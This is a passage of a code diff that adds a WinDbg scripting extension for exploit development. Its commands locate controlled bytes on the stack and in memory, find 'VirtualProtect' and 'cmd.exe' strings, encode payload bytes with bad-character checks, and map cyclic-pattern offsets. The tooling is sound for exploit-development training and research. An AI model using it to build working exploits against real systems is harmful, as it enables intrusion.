+        backwardNonSequentialRejected: (_i = backward.stats.nonSequentialRejected) != null ? _i : 0,
+        backwardGadgets: backwardAdded,
+        backwardRawCandidates: (_j = backward.stats.gadgetsDiscovered) != null ? _j : 0,
+        backwardFiltered: Math.max(0, ((_k = backward.stats.gadgetsDiscovered) != null ? _k : 0) - backwardAdded),
+        backwardLimit: (_l = backward.stats.candidateLimit) != null ? _l : 0,
+        backwardComplete: backward.stats.stoppedEarly === 1 ? 0 : 1
+      }
+    };
+  }
+
+  // src/commands/memory.ts
+  function flag(value) {
+    return value === null ? "unknown" : value ? "yes" : "no";
+  }
+  function createMemoryCommand() {
+    return {
+      name: "memory",
+      description: "Inspect normalized memory-region evidence for an address.",
+      usage: "dx @$osed().memory(0x41414141)",
+      examples: ["dx @$osed().memory(0x41414141)", 'dx @$osed().memory("0012F800")'],
+      schema: { address: { type: ["number", "string"], required: true } },
+      execute(options) {
+        const address = normalizeAddress(options.address);
+        const evidence = memoryRegion(address);
+        section("Memory Evidence");
+        info(`Address: ${formatAddress(address, 8)}`);
+        table([
+          { key: "read", header: "Read" },
+          { key: "write", header: "Write" },
+          { key: "exec", header: "Exec" },
+          { key: "guard", header: "Guard" },
+          { key: "noAccess", header: "No access" },
+          { key: "commit", header: "Committed" },
+          { key: "type", header: "Type" }
+        ], [{
+          read: flag(evidence.readable),
+          write: flag(evidence.writable),
+          exec: flag(evidence.executable),
+          guard: flag(evidence.guarded),
+          noAccess: flag(evidence.noAccess),
+          commit: flag(evidence.committed),
+          type: evidence.regionType
+        }]);
+        for (const warning of evidence.warnings)
+          warn(warning);
+        return { command: "memory", args: options, success: true, findings: [serializeMemoryRegionEvidence(evidence)], warnings: evidence.warnings, errors: [] };
+      }
+    };
+  }
+
+  // src/commands/landing.ts
+  function landingDxRows(evidence) {
+    return evidence.observations.map((item) => {
+      var _a, _b, _c;
+      return {
+        Observation: item.kind,
+        Address: (_a = item.address) != null ? _a : "",
+        Length: (_c = (_b = item.length) == null ? void 0 : _b.toString()) != null ? _c : "",
+        Confidence: item.confidence.toFixed(2)
+      };
+    });
+  }
+  function createLandingCommand() {
+    return {
+      name: "landing",
+      description: "Analyze exploit-relevant evidence at ESP/RSP or an explicit address.",
+      usage: "dx @$osed().landing()",
+      examples: ["dx @$osed().landing()", "dx @$osed().landing(0x0012F800)"],
+      schema: { address: { type: ["number", "string"] } },
+      execute(options) {
+        const address = options.address === void 0 ? void 0 : normalizeAddress(options.address);
+        const evidence = landing(address);
+        section("Landing Evidence");
+        if (evidence.address !== void 0)
+          info(`Address: ${formatAddress(evidence.address, 8)}`);
+        table([
+          { key: "kind", header: "Observation" },
+          { key: "address", header: "Address" },
+          { key: "length", header: "Length" },
+          { key: "confidence", header: "Confidence" }
+        ], evidence.observations.map((item) => {
+          var _a, _b;
+          return {
+            kind: item.kind,
+            address: item.address === void 0 ? "" : formatAddress(item.address, 8),
+            length: (_b = (_a = item.length) == null ? void 0 : _a.toString()) != null ? _b : "",
+            confidence: item.confidence.toFixed(2)
+          };
+        }));
+        info(evidence.recommendation);
+        const available = evidence.address !== void 0;
+        return {
+          command: "landing",
+          args: options,
+          success: available,
+          findings: [serializeLandingEvidence(evidence)],
+          warnings: available ? [] : [evidence.recommendation],
+          errors: []
+        };
+      }
+    };
+  }
+
+  // src/logic/math_logic.ts
+  var VALID_BITS = /* @__PURE__ */ new Set([8, 16, 32, 64]);
+  function normalizeMathBits(value) {
+    const bits = value === void 0 ? 32 : value;
+    if (typeof bits !== "number" || !Number.isInteger(bits) || !VALID_BITS.has(bits)) {
+      throw new Error("bits must be one of: 8, 16, 32, 64.");
+    }
+    return bits;
+  }
+  function parseMathValue(value) {
+    if (typeof value === "bigint")
+      return value;
+    if (typeof value === "number") {
+      if (!Number.isFinite(value) || !Number.isInteger(value)) {
+        throw new Error("value must be an integer.");
+      }
+      return __bi(value);
+    }
+    if (typeof value !== "string") {
+      throw new Error("value must be an integer, bigint, decimal string, or hex string.");
+    }
+    const text = value.trim().replace(/`/g, "");
+    if (/^-?0x[0-9a-f]+$/i.test(text)) {
+      const negative = text.startsWith("-");
+      const hex4 = negative ? text.slice(3) : text.slice(2);
+      const parsed = __bi(`0x${hex4}`);
+      return negative ? -parsed : parsed;
+    }
+    if (/^-?[0-9]+$/.test(text)) {
+      return __bi(text);
+    }
+    if (/^[0-9a-f]+$/i.test(text) && /[a-f]/i.test(text)) {
+      return __bi(`0x${text}`);
+    }
+    throw new Error("value strings must be decimal or hex, e.g. -42, 0xFFFFFFD6, or FFD6.");
+  }
+  function analyzeMathValue(rawValue, rawBits) {
+    const bits = normalizeMathBits(rawBits);
+    const value = parseMathValue(rawValue);
+    const modulus = __bi.shl(__bi(1), __bi(bits));
+    const mask = modulus - __bi(1);
+    const unsigned = __bi.and(value, mask);
+    const signBit = __bi.shl(__bi(1), __bi(bits - 1));
+    const signed = __bi.and(unsigned, signBit) !== __bi(0) ? unsigned - modulus : unsigned;
+    const width = bits / 4;
+    const byteCount = bits / 8;
+    const hex4 = `0x${unsigned.toString(16).toUpperCase().padStart(width, "0")}`;
+    const littleEndianBytes = [];
+    for (let i = 0; i < byteCount; i += 1) {
+      const byte = Number(__bi.and(__bi.shr(unsigned, __bi(i * 8)), __bi(255)));
+      littleEndianBytes.push(byte.toString(16).toUpperCase().padStart(2, "0"));
+    }
+    return {
+      input: typeof rawValue === "string" ? rawValue : value.toString(),
+      bits,
+      hex: hex4,
+      unsigned: unsigned.toString(),
+      signed: signed.toString(),
+      littleEndianBytes: littleEndianBytes.join(" "),
+      twosComplement: hex4
+    };
+  }
+
+  // src/commands/math.ts
+  function createMathCommand() {
+    return {
+      name: "math",
+      description: "Format an integer as hex, signed, unsigned, little-endian bytes, and two's complement.",
+      usage: "dx @$osed().math(value, bits?)",
+      examples: [
+        "dx @$osed().math(0xFFFFFFD6)",
+        "dx @$osed().math(-42, 32)",
+        "dx @$osed().math(0x625011D3, 32)"
+      ],
+      schema: {
+        value: { type: ["number", "string"], required: true },
+        bits: { type: "number", default: 32 }
+      },
+      execute(options) {
+        const evidence = analyzeMathValue(options.value, options.bits);
+        section("Math");
+        table([
+          { key: "field", header: "Field", width: 18 },
+          { key: "value", header: "Value", width: 24 }
+        ], [
+          { field: "Input", value: evidence.input },
+          { field: "Bits", value: evidence.bits.toString() },
+          { field: "Hex", value: evidence.hex },
+          { field: "Unsigned", value: evidence.unsigned },
+          { field: "Signed", value: evidence.signed },
+          { field: "Little-endian", value: evidence.littleEndianBytes },
+          { field: "Two's complement", value: evidence.twosComplement }
+        ]);
+        return {
+          command: "math",
+          args: options,
+          success: true,
+          findings: [evidence],
+          warnings: [],
+          errors: []
+        };
+      }
+    };
+  }
+
+  // src/commands/version.ts
+  function createVersionCommand() {
+    return {
+      name: "version",
+      description: "Show the loaded osed-windbg build identity.",
+      usage: "dx @$osed().version()",
+      examples: ["dx @$osed().version()", 'dx @$osed().help("version")'],
+      schema: {},
+      execute(options) {
+        const info2 = getVersionInfo();
+        const rows = [
+          { Field: "Name", Value: info2.name },
+          { Field: "Version", Value: info2.version },
+          { Field: "BuildTime", Value: info2.buildTime },
+          { Field: "GitCommit", Value: info2.gitCommit },
+          { Field: "GitDirty", Value: info2.gitDirty ? "yes" : "no" }
+        ];
+        section("OSED Version");
+        table([
+          { key: "Field", header: "Field" },
+          { key: "Value", header: "Value" }
+        ], rows);
+        return {
+          command: "version",
+          args: options,
+          success: true,
+          findings: [info2],
+          warnings: [],
+          errors: []
+        };
+      }
+    };
+  }
+
+  // src/commands/strings.ts
+  var DEFAULT_MAX_READ = 256;
+  var DEFAULT_MAX_RESULTS = 50;
+  function normalizeEncoding(value, fallback = "ascii") {
+    const text = String(value != null ? value : fallback).trim().toLowerCase();
+    if (text === "ascii" || text === "ansi") {
+      return "ascii";
+    }
+    if (text === "utf16" || text === "utf-16" || text === "utf16le" || text === "wide") {
+      return "utf16le";
+    }
+    throw new Error("encoding must be ascii or utf16le.");
+  }
+  function normalizeFindEncoding(value) {
+    const text = String(value != null ? value : "both").trim().toLowerCase();
+    if (text === "both") {
+      return "both";
+    }
+    return normalizeEncoding(text);
+  }
+  function byteToPython(byte) {
+    if (byte >= 32 && byte <= 126 && byte !== 34 && byte !== 92) {
+      return String.fromCharCode(byte);
+    }
+    if (byte === 34)
+      return '\\"';
+    if (byte === 92)
+      return "\\\\";
+    return `\\x${byte.toString(16).padStart(2, "0")}`;
+  }
+  function bytesToPython2(bytes) {
+    return `b"${bytes.map(byteToPython).join("")}"`;
+  }
+  function bytesToHex2(bytes) {
+    return bytes.map((byte) => byte.toString(16).toUpperCase().padStart(2, "0")).join(" ");
+  }
+  function littleEndianPointer(address, pointerSize) {
+    const bytes = [];
+    for (let i = 0; i < pointerSize; i += 1) {
+      bytes.push(Number(__bi.and(__bi.shr(address, __bi(i * 8)), __bi(255))));
+    }
+    return bytes;
+  }
+  function encodeText(text, encoding, terminator = false) {
+    const bytes = [];
+    if (encoding === "ascii") {
+      for (let i = 0; i < text.length; i += 1) {
+        const code = text.charCodeAt(i);
+        if (code > 127) {
+          throw new Error("ASCII strings may only contain 0x00..0x7F characters.");
+        }
+        bytes.push(code & 255);
+      }
+      if (terminator)
+        bytes.push(0);
+      return bytes;
+    }
+    for (let i = 0; i < text.length; i += 1) {
+      const code = text.charCodeAt(i);
+      bytes.push(code & 255, code >>> 8 & 255);
+    }
+    if (terminator)
+      bytes.push(0, 0);
+    return bytes;
+  }
+  function decodeBytes(bytes, encoding) {
+    if (encoding === "ascii") {
+      const chars2 = [];
+      for (let i = 0; i < bytes.length; i += 1) {
+        if (bytes[i] === 0) {
+          return { text: chars2.join(""), length: i, terminated: true };
+        }
+        chars2.push(String.fromCharCode(bytes[i]));
+      }
+      return { text: chars2.join(""), length: bytes.length, terminated: false };
+    }
+    const chars = [];
+    const evenLength = bytes.length - bytes.length % 2;
+    for (let i = 0; i < evenLength; i += 2) {
+      const code = bytes[i] | bytes[i + 1] << 8;
+      if (code === 0) {
+        return { text: chars.join(""), length: i, terminated: true };
+      }
+      chars.push(String.fromCharCode(code));
+    }
+    return { text: chars.join(""), length: evenLength, terminated: false };
+  }
+  function addressRow(address, pointerSize) {
+    return formatAddress(address, pointerSize);
+  }
+  function moduleOffset(address) {
+    const moduleInfo = findModuleByAddress(address);
+    if (!moduleInfo) {
+      return "n/a";
+    }
+    return `${moduleInfo.name}+0x${(address - moduleInfo.base).toString(16).toUpperCase()}`;
+  }
+  function readContext(address, pointerSize) {
+    const before = __bi(4);
+    const start = address >= before ? address - before : __bi(0);
+    const bytes = tryReadMemory(start, pointerSize + 8);
+    return bytes ? bytesToHex2(Array.from(bytes)) : "unreadable";
+  }
+  function findStringOccurrences(text, module, encoding, maxResults) {
+    const encodings = encoding === "both" ? ["ascii", "utf16le"] : [encoding];
+    const findings = [];
+    const warnings = [];
+    const seen = /* @__PURE__ */ new Set();
+    for (const selected of encodings) {
+      const pattern = Uint8Array.from(encodeText(text, selected, false));
+      if (pattern.length === 0) {
+        throw new Error("text must not be empty.");
+      }
+      const scan = scanPattern({
+        module,
+        executableOnly: false,
+        maxResults: Math.max(0, maxResults - findings.length),
+        chunkSize: 16384
+      }, pattern);
+      for (const address of scan.hits) {
+        const key2 = `${address.toString()}:${selected}`;
+        if (seen.has(key2)) {
+          continue;
+        }
+        seen.add(key2);
+        findings.push({ address, encoding: selected, text });
+      }
+      warnings.push(...scan.warnings.map((warning) => `${warning.region}: ${warning.message}`));
+      if (findings.length >= maxResults) {
+        break;
+      }
+    }
+    return { findings: findings.slice(0, maxResults), warnings };
+  }
+  function parseAddressCandidate(value) {
+    if (typeof value === "number") {
+      return normalizeAddress(value);
+    }
+    if (typeof value !== "string") {
+      return void 0;
+    }
+    const text = value.trim();
+    if (/^(0x)?[0-9a-f`]+$/i.test(text)) {
+      return normalizeAddress(text.replace(/`/g, ""));
+    }
+    return void 0;
+  }
+  function createStringCommands() {
+    const readString = {
+      name: "str_read",
+      description: "Read a null-terminated ASCII or UTF-16LE string from memory.",
+      usage: "dx @$osed().str.read(address, max?, encoding?)",
+      examples: [
+        "dx @$osed().str.read(0x0019F920)",
+        'dx @$osed().str.read(0x0019F920, 128, "utf16le")'
+      ],
+      schema: {
+        address: { type: ["number", "string"], required: true },
+        max: { type: "number", min: 1, max: 4096, default: DEFAULT_MAX_READ },
+        encoding: { type: "string", default: "ascii" }
+      },
+      execute(options) {
+        const pointerSize = getPointerSize();
+        const address = normalizeAddress(options.address);
+        const max = options.max;
+        const encoding = normalizeEncoding(options.encoding);
+        const bytes = tryReadMemory(address, max);
+        if (!bytes) {
+          throw new Error(`Could not read ${max} bytes at ${addressRow(address, pointerSize)}.`);
+        }
+        const decoded = decodeBytes(bytes, encoding);
+        const finding = {
+          address,
+          encoding,
+          text: decoded.text,
+          length: decoded.length,
+          terminated: decoded.terminated
+        };
+        section("String Read");
+        info(`Address:    ${addressRow(address, pointerSize)}`);
+        info(`Encoding:   ${encoding}`);
+        info(`Length:     ${decoded.length} bytes`);
+        info(`Terminated: ${decoded.terminated ? "yes" : "no"}`);
+        print(decoded.text);
+        return {
+          command: "str_read",
+          args: options,
+          success: true,
+          findings: [finding],
+          warnings: decoded.terminated ? [] : [`No terminator found within ${max} bytes.`],
+          errors: []
+        };
+      }
+    };
+    const findString = {
+      name: "str_find",
+      description: "Find ASCII and/or UTF-16LE string bytes in loaded module sections.",
+      usage: "dx @$osed().str.find(text, module?, encoding?, maxResults?)",
+      examples: [
+        'dx @$osed().str.find("VirtualProtect")',
+        'dx @$osed().str.find("cmd.exe", "target", "ascii", 25)'
+      ],
+      schema: {
+        text: { type: "string", required: true },
+        module: { type: "string" },
+        encoding: { type: "string", default: "both" },
+        maxResults: { type: "number", min: 1, max: 200, default: DEFAULT_MAX_RESULTS }
+      },
+      execute(options) {
+        const text = options.text;
+        const module = options.module;
+        const encoding = normalizeFindEncoding(options.encoding);
+        const maxResults = options.maxResults;
+        const pointerSize = getPointerSize();
+        const { findings, warnings } = findStringOccurrences(text, module, encoding, maxResults);
+        const rows = findings.slice(0, maxResults).map((finding) => ({
+          address: addressRow(finding.address, pointerSize),
+          encoding: finding.encoding,
+          python: `0x${finding.address.toString(16).toUpperCase()}`
+        }));
+        section("String Find");
+        info(`Text:     ${text}`);
+        info(`Encoding: ${encoding}`);
+        table([
+          { key: "address", header: "Address", width: 18 },
+          { key: "encoding", header: "Encoding", width: 9 },
+          { key: "python", header: "Python", width: 14 }
+        ], rows);
+        return {
+          command: "str_find",
+          args: options,
+          success: true,
+          findings: findings.slice(0, maxResults),
+          warnings,
+          errors: [],
+          stats: { results: Math.min(findings.length, maxResults) }
+        };
+      }
+    };
+    const refsString = {
+      name: "str_refs",
+      description: "Find executable absolute-pointer references to a string address or literal.",
+      usage: "dx @$osed().str.refs(target, module?, encoding?, maxResults?)",
+      examples: [
+        'dx @$osed().str.refs("VirtualProtect")',
+        'dx @$osed().str.refs(0x00403080, "target", "ascii", 25)'
+      ],
+      schema: {
+        target: { type: ["number", "string"], required: true },
+        module: { type: "string" },
+        encoding: { type: "string", default: "both" },
+        maxResults: { type: "number", min: 1, max: 200, default: DEFAULT_MAX_RESULTS }
+      },
+      execute(options) {
+        const target = options.target;
+        const module = options.module;
+        const encoding = normalizeFindEncoding(options.encoding);
+        const maxResults = options.maxResults;
+        const pointerSize = getPointerSize();
+        const warnings = [];
+        const strings = [];
+        const explicitAddress = parseAddressCandidate(target);
+        if (pointerSize === 8) {
+          warnings.push("str.refs scans absolute 64-bit pointer bytes on x64; RIP-relative references are not covered.");
+        }
+        if (explicitAddress !== void 0) {
+          strings.push({ address: explicitAddress });
+        } else if (typeof target === "string") {
+          const found = findStringOccurrences(target, module, encoding, maxResults);
+          strings.push(...found.findings);
+          warnings.push(...found.warnings);
+        } else {
+          throw new Error("target must be an address or string literal.");
+        }
+        const findings = [];
+        const seenRefs = /* @__PURE__ */ new Set();
+        for (const stringHit of strings) {
+          if (findings.length >= maxResults) {
+            break;
+          }
+          const pointerBytes = littleEndianPointer(stringHit.address, pointerSize);
+          const scan = scanPattern({
+            module,
+            executableOnly: true,
+            maxResults: Math.max(0, maxResults - findings.length),
+            chunkSize: 16384
+          }, Uint8Array.from(pointerBytes));
+          warnings.push(...scan.warnings.map((warning) => `${warning.region}: ${warning.message}`));
+          for (const refAddress of scan.hits) {
+            const key2 = `${refAddress.toString()}:${stringHit.address.toString()}`;
+            if (seenRefs.has(key2)) {
+              continue;
+            }
+            seenRefs.add(key2);
+            findings.push({
+              refAddress,
+              stringAddress: stringHit.address,
+              moduleOffset: moduleOffset(refAddress),
+              encoding: stringHit.encoding,
+              text: stringHit.text,
+              pointerBytes,
+              contextBytes: readContext(refAddress, pointerSize)
+            });
+            if (findings.length >= maxResults) {
+              break;
+            }
+          }
+        }
+        const rows = findings.map((finding) => {
+          var _a;
+          return {
+            ref: addressRow(finding.refAddress, pointerSize),
+            string: addressRow(finding.stringAddress, pointerSize),
+            module: finding.moduleOffset,
+            encoding: (_a = finding.encoding) != null ? _a : "address",
+            context: finding.contextBytes
+          };
+        });
+        section("String References");
+        info(`Target: ${String(target)}`);
+        table([
+          { key: "ref", header: "Ref", width: 18 },
+          { key: "string", header: "String", width: 18 },
+          { key: "module", header: "Module+Offset", width: 22 },
+          { key: "encoding", header: "Encoding", width: 9 },
+          { key: "context", header: "Context" }
+        ], rows);
+        return {
+          command: "str_refs",
+          args: options,
+          success: true,
+          findings,
+          warnings,
+          errors: [],
+          stats: { strings: strings.length, results: findings.length }
+        };
+      }
+    };
+    const stringBytes = {
+      name: "str_bytes",
+      description: "Encode text as payload bytes and report bad-character hits.",
+      usage: "dx @$osed().str.bytes(text, encoding?, terminator?, exclude?)",
+      examples: [
+        'dx @$osed().str.bytes("cmd.exe")',
+        'dx @$osed().str.bytes("W00T", "ascii", true, "00 0A 0D")'
+      ],
+      schema: {
+        text: { type: "string", required: true },
+        encoding: { type: "string", default: "ascii" },
+        terminator: { type: "boolean", default: false },
+        exclude: { type: "array", elementType: "number", default: [0, 10, 13] }
+      },
+      execute(options) {
+        var _a;
+        const text = options.text;
+        const encoding = normalizeEncoding(options.encoding);
+        const terminator = options.terminator;
+        const normalizedExclude = normalizeByteArray((_a = options.exclude) != null ? _a : [0, 10, 13]);
+        const exclude = new Set(normalizedExclude.values);
+        const bytes = encodeText(text, encoding, terminator);
+        const badchars = bytes.map((byte, offset) => ({ byte, offset })).filter((entry) => exclude.has(entry.byte));
+        const warnings = normalizedExclude.warning ? [normalizedExclude.warning] : [];
+        section("String Bytes");
+        info(`Encoding:   ${encoding}`);
+        info(`Terminator: ${terminator ? "yes" : "no"}`);
+        info(`Length:     ${bytes.length} bytes`);
+        print(bytesToHex2(bytes));
+        print(bytesToPython2(bytes));
+        if (badchars.length > 0) {
+          warn(`Bad characters: ${badchars.map((entry) => `${formatHexByte(entry.byte)}@${entry.offset}`).join(", ")}`);
+        }
+        return {
+          command: "str_bytes",
+          args: options,
+          success: true,
+          findings: [{ text, encoding, terminator, bytes, python: bytesToPython2(bytes), badchars }],
+          warnings,
+          errors: []
+        };
+      }
+    };
+    return [readString, findString, refsString, stringBytes];
+  }
+
+  // src/commands/find_stack_bytes.ts
+  function stackBounds2(pointerSize) {
+    if (pointerSize !== 4) {
+      return {};
+    }
+    const teb = resolveTeb32Address(host.currentThread);
+    if (!teb) {
+      return {};
+    }
+    try {
+      return {
+        base: readPointer(teb + __bi(4), 4),
+        limit: readPointer(teb + __bi(8), 4)
+      };
+    } catch (_error) {
+      return {};
+    }
+  }
+  function findPattern(buffer, pattern, maxResults) {
+    const hits = [];
+    if (pattern.length === 0 || buffer.length < pattern.length) {
+      return hits;
+    }
+    const last = buffer.length - pattern.length;
+    for (let i = 0; i <= last; i += 1) {
+      let match = true;
+      for (let j = 0; j < pattern.length; j += 1) {
+        if (buffer[i + j] !== pattern[j]) {
+          match = false;
+          break;
+        }
+      }
+      if (match) {
+        hits.push(i);
+        if (hits.length >= maxResults) {
+          break;
+        }
+      }
+    }
+    return hits;
+  }
+  function createFindStackBytesCommand() {
+    return {
+      name: "find_stack_bytes",
+      description: "Find byte sequence hits in the current thread stack only.",
+      usage: "dx @$osed().find_stack_bytes(bytes, maxResults?, stackBytes?)",
+      examples: [
+        'dx @$osed().find_stack_bytes("43 43 43 43")',
+        'dx @$osed().find_stack_bytes("43 43 43 43", 20, 4096)'
+      ],
+      schema: {
+        bytes: { type: "array", elementType: "number", required: true },
+        maxResults: { type: "number", min: 1, max: 200, default: 50 },
+        stackBytes: { type: "number", min: 16, max: 1048576 }
+      },
+      execute(options) {
+        var _a;
+        const bytes = options.bytes;
+        if (bytes.length === 0 || bytes.some((value) => !Number.isInteger(value) || value < 0 || value > 255)) {
+          throw new Error("bytes must contain 0x00..0xFF integers.");
+        }
+        const pointerSize = getPointerSize();
+        const regs = readRegisters(pointerSize);
+        if (regs.sp === void 0) {
+          throw new Error("Stack pointer is unavailable.");
+        }
+        const bounds = stackBounds2(pointerSize);
+        let searchBytes = options.stackBytes;
+        const warnings = [];
+        if (searchBytes === void 0 && bounds.base !== void 0 && bounds.base > regs.sp) {
+          searchBytes = Number(bounds.base - regs.sp);
+        }
+        if (searchBytes === void 0) {
+          searchBytes = 4096;
+          warnings.push("Stack bounds unavailable; defaulted to a 4096-byte search window from SP.");
+        }
+        if (bounds.base !== void 0 && bounds.base > regs.sp) {
+          const maxToBase = Number(bounds.base - regs.sp);
+          if (searchBytes > maxToBase) {
+            searchBytes = maxToBase;
+            warnings.push("stackBytes exceeded StackBase and was clamped to the current thread stack range.");
+          }
+        }
+        const buffer = readMemory(regs.sp, searchBytes);
+        const pattern = Uint8Array.from(bytes);
+        const offsets = findPattern(buffer, pattern, options.maxResults);
+        section("Find Stack Bytes");
+        info(`Start: ${formatAddress(regs.sp, pointerSize)} (${((_a = regs.spName) != null ? _a : "sp").toUpperCase()})`);
+        if (bounds.base !== void 0) {
+          info(`StackBase: ${formatAddress(bounds.base, pointerSize)}`);
+        }
+        if (bounds.limit !== void 0) {
+          info(`StackLimit: ${formatAddress(bounds.limit, pointerSize)}`);
+        }
+        info(`Searched ${searchBytes} byte(s) in the current thread stack.`);
+        table([
+          { key: "address", header: "Address", width: 18 },
+          { key: "offset", header: "SP+Offset", width: 12 }
+        ], offsets.map((offset) => ({
+          address: formatAddress(regs.sp + __bi(offset), pointerSize),
+          offset: `0x${offset.toString(16).toUpperCase()}`
+        })));
+        if (offsets.length === 0) {
+          info("No byte matches found in the searched stack window.");
+        }
+        info("Scope: current thread stack only; this does not search heap, modules outside the stack window, or arbitrary process memory.");
+        whyItMatters("Stack-local byte matches confirm whether your input landed near control data and help anchor overwrite offsets quickly.");
+        return {
+          command: "find_stack_bytes",
+          args: options,
+          success: true,
+          findings: offsets.map((offset) => regs.sp + __bi(offset)),
+          warnings,
+          errors: [],
+          stats: {
+            searchedBytes: searchBytes,
+            results: offsets.length
+          }
+        };
+      }
+    };
+  }
+
+  // src/commands/find_mem_bytes.ts
+  function findPattern2(buffer, pattern, maxResults) {
+    const hits = [];
+    if (pattern.length === 0 || buffer.length < pattern.length) {
+      return hits;
+    }
+    const last = buffer.length - pattern.length;
+    for (let i = 0; i <= last; i += 1) {
+      let match = true;
+      for (let j = 0; j < pattern.length; j += 1) {
+        if (buffer[i + j] !== pattern[j]) {
+          match = false;
+          break;
+        }
+      }
+      if (match) {
+        hits.push(i);
+        if (hits.length >= maxResults) {
+          break;
+        }
+      }
+    }
+    return hits;
+  }
+  function readLargestWindow2(start, maxLength) {
+    let low = 1;
+    let high = maxLength;
+    let best;
+    while (low <= high) {
+      const mid = low + Math.floor((high - low) / 2);
+      try {
+        const chunk = readMemory(start, mid);
+        best = chunk;
+        low = mid + 1;
+      } catch (_error) {
+        high = mid - 1;
+      }
+    }
+    return best;
+  }
+  function scanReadableRange(start, length, pattern, maxResults) {
+    const hits = [];
+    const warnings = [];
+    const chunkSize = 4096;
+    const skipSize = 4096;
+    let offset = 0;
+    let scannedBytes = 0;
+    let previousTail = new Uint8Array(0);
+    let previousTailStart = start;
+    while (offset < length && hits.length < maxResults) {
+      const current = start + __bi(offset);
+      const remaining = length - offset;
+      const requested = Math.min(chunkSize, remaining);
+      let chunk;
+      try {
+        chunk = readMemory(current, requested);
+      } catch (_error) {
+        chunk = readLargestWindow2(current, requested);
+        if (!chunk) {
+          warnings.push(`Skipped unreadable range at ${formatAddress(current, getPointerSize())}.`);
+          previousTail = new Uint8Array(0);
+          offset += Math.min(skipSize, remaining);
+          continue;
+        }
+        warnings.push(`Range at ${formatAddress(current, getPointerSize())} was only partially readable; scanned ${chunk.length} byte(s).`);
+      }
+      scannedBytes += chunk.length;
+      const combined = new Uint8Array(previousTail.length + chunk.length);
+      combined.set(previousTail, 0);
+      combined.set(chunk, previousTail.length);
+      const combinedBase = previousTailStart;
+      const offsets = findPattern2(combined, pattern, maxResults - hits.length);
+      for (const matchOffset of offsets) {
+        const address = combinedBase + __bi(matchOffset);
+        if (address >= current) {
+          hits.push(address);
+        }
+      }
+      const tailLength = Math.min(pattern.length - 1, chunk.length);
+      previousTail = tailLength > 0 ? chunk.slice(chunk.length - tailLength) : new Uint8Array(0);
+      previousTailStart = current + __bi(chunk.length - tailLength);
+      offset += chunk.length;
+    }
+    return { hits, warnings, scannedBytes };
+  }
+  function createFindMemBytesCommand() {
+    return {
+      name: "find_mem_bytes",
+      description: "Find byte sequence hits in an explicit live-memory range.",
+      usage: "dx @$osed().find_mem_bytes(address, length, bytes, maxResults?)",
+      examples: [
+        'dx @$osed().find_mem_bytes(0x14800000, 0x16000, "43 43 43 43")',
+        'dx @$osed().find_mem_bytes("14800000", 4096, "FF E4", 20)'
+      ],
+      schema: {
+        address: { type: ["number", "string"], required: true },
+        length: { type: "number", min: 1, max: 16777216, required: true },
+        bytes: { type: "array", elementType: "number", required: true },
+        maxResults: { type: "number", min: 1, max: 200, default: 50 }
+      },
+      execute(options) {
+        const address = normalizeAddress(options.address);
+        const length = options.length;
+        const bytes = options.bytes;
+        if (bytes.length === 0 || bytes.some((value) => !Number.isInteger(value) || value < 0 || value > 255)) {
+          throw new Error("bytes must contain 0x00..0xFF integers.");
+        }
+        const pointerSize = getPointerSize();
+        const pattern = Uint8Array.from(bytes);
+        const scan = scanReadableRange(address, length, pattern, options.maxResults);
+        section("Find Memory Bytes");
+        info(`Start: ${formatAddress(address, pointerSize)}`);
+        info(`Length: 0x${length.toString(16).toUpperCase()} (${length}) byte(s)`);
+        table([
+          { key: "address", header: "Address", width: 18 },
+          { key: "offset", header: "Base+Offset", width: 12 }
+        ], scan.hits.map((hit) => ({
+          address: formatAddress(hit, pointerSize),
+          offset: `0x${(hit - address).toString(16).toUpperCase()}`
+        })));
+        info(`Scanned ${scan.scannedBytes} readable byte(s) in the requested range.`);
+        for (const warning of scan.warnings) {
+          warn(warning);
+        }
+        if (scan.hits.length === 0) {
+          info("No byte matches found in the searched memory range.");
+        }
+        info("Scope: explicit live-memory range only; this can search stack, heap, modules, or any readable region if you provide the correct address and length.");
+        whyItMatters("Explicit live-memory searches let you confirm where controlled bytes landed without assuming they live in a module image or the current stack window.");
+        return {
+          command: "find_mem_bytes",
+          args: options,
+          success: true,
+          findings: scan.hits,
+          warnings: scan.warnings,
+          errors: [],
+          stats: {
+            searchedBytes: length,
+            readableBytes: scan.scannedBytes,
+            results: scan.hits.length
+          }
+        };
+      }
+    };
+  }
+
+  // src/analysis/stackmap.ts
+  var CALL_NEAR_REL32 = 232;
+  var CALL_INDIRECT_FF = 255;
+  function isCallInstruction(bytes) {
+    if (bytes.length === 0)
+      return false;
+    if (bytes[0] === CALL_NEAR_REL32 && bytes.length >= 5)
+      return true;
+    if (bytes[0] === CALL_INDIRECT_FF && bytes.length >= 2) {
+      const modrm = bytes[1];
+      const reg = modrm >> 3 & 7;
+      return reg === 2 || reg === 3;
+    }
+    return false;
+  }
+  function verifyCallSite(returnAddress, pointerSize) {
+    const candidates2 = pointerSize === 8 ? [7, 6, 5, 3, 2] : [5, 6, 3, 2];
+    for (const len of candidates2) {
+      const callAddr = returnAddress - __bi(len);
+      const bytes = tryReadMemory(callAddr, len);
+      if (bytes && isCallInstruction(bytes))
+        return true;
+    }
+    return false;
+  }
+  function matchPattern(value, haystacks) {
+    const low = Number(__bi.and(value, __bi(4294967295)));
+    const needle = decodeOffsetNeedle(low);
+    const msfIdx = haystacks.msf.indexOf(needle);
+    if (msfIdx >= 0)
+      return { kind: "msf", offset: msfIdx };
+    const cyclicIdx = haystacks.cyclic.indexOf(needle);
+    if (cyclicIdx >= 0)
+      return { kind: "cyclic", offset: cyclicIdx };
+    return void 0;
+  }
+  function classifySlot(offset, address, value, pointerSize, sp, stackEnd, haystacks) {
+    const slot = {
+      offset,
+      address,
+      value,
+      classification: "DATA",
+      detail: "local / arg"
+    };
+    if (value === __bi(0)) {
+      slot.classification = "NULL";
+      slot.detail = "frame boundary";
+      return slot;
+    }
+    const pattern = matchPattern(value, haystacks);
+    if (pattern) {
+      slot.classification = "PATTERN";
+      slot.patternKind = pattern.kind;
+      slot.patternOffset = pattern.offset;
+      slot.detail = `${pattern.kind} offset ${pattern.offset}`;
+      return slot;
+    }
+    if (value >= sp && value < stackEnd) {
+      slot.classification = "SAVED_EBP";
+      slot.detail = "points into stack";
+      return slot;
+    }
+    const mod = findModuleByAddress(value);
+    if (mod) {
+      slot.module = mod.name;
+      slot.moduleOffset = value - mod.base;
+      const isCall = verifyCallSite(value, pointerSize);
+      if (isCall) {
+        slot.classification = "RET";
+        slot.callSiteVerified = true;
